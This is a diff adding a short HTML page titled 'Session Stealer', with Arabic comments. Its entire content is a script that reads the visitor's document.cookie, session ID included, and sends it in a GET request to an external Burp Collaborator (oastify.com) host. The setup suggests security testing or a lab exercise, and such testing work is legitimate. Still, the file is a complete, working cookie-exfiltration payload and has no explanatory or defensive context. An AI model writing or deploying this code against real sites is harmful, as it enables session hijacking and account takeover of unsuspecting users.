@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Session Stealer</title>
+</head>
+<body>
+    <script type="text/javascript">
+        // سحب الكوكيز التي تحتوي على Session ID
+        var cookies = document.cookie;
+
+        // إرسال الكوكيز إلى خادم Burp Collaborator الخاص بك
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "http://s0tu51emvhznkxvp8c7mkdqqehkf85wu.oastify.com?cookie=" + cookies, true);
+        xhr.send();
+    </script>
+</body>
+</html>
